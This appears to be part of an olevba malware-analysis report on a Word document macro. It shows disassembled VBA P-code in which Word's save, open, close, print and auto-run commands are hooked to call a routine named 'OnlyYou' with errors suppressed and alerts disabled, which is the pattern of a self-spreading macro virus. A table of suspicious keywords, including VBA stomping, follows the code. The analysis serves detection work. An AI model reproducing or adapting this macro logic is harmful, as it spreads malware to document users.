' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #193:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #194:
' 	EndSub 
' Line #195:
' 	FuncDefn (Sub Cyber())
' Line #196:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #197:
' 	EndSub 
' Line #198:
' 	FuncDefn (Sub FileSave())
' Line #199:
' 	OnError (Resume Next) 
' Line #200:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #201:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #202:
' 	EndSub 
' Line #203:
' 	FuncDefn (Sub FileClose())
' Line #204:
' 	OnError (Resume Next) 
' Line #205:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #206:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #207:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #208:
' 	EndSub 
' Line #209:
' 	FuncDefn (Sub FileExit())
' Line #210:
' 	OnError (Resume Next) 
' Line #211:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #212:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #213:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #214:
' 	EndSub 
' Line #215:
' 	FuncDefn (Sub FileNew())
' Line #216:
' 	OnError (Resume Next) 
' Line #217:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #218:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #219:
' 	EndSub 
' Line #220:
' 	FuncDefn (Sub AutoOpen())
' Line #221:
' 	OnError (Resume Next) 
' Line #222:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #223:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #224:
' 	EndSub 
' Line #225:
' 	FuncDefn (Sub AutoExec())
' Line #226:
' 	OnError (Resume Next) 
' Line #227:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #228:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #229:
' 	EndSub 
' Line #230:
' 	FuncDefn (Sub FileSaveAs())
' Line #231:
' 	OnError (Resume Next) 
' Line #232:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #233:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #234:
' 	EndSub 
' Line #235:
' 	FuncDefn (Sub FilePageSetup())
' Line #236:
' 	OnError (Resume Next) 
' Line #237:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #238:
' 	Ld wdDialogFilePageSetup 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #239:
' 	EndSub 
' Line #240:
' 	FuncDefn (Sub FilePrint())
' Line #241:
' 	OnError (Resume Next) 
' Line #242:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #243:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #244:
' 	EndSub 
' Line #245:
' 	FuncDefn (Sub FileOpen())
' Line #246:
' 	OnError (Resume Next) 
' Line #247:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #248:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #249:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #250:
' 	EndSub 
' Line #251:
' 	FuncDefn (Sub AutoClose())
' Line #252:
' 	OnError (Resume Next) 
' Line #253:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #254:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #255:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #256:
' 	EndSub 
' Line #257:
' 	FuncDefn (Sub AutoExit())
' Line #258:
' 	OnError (Resume Next) 
' Line #259:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #260:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #261:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #262:
' 	EndSub 
' Line #263:
' Line #264:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

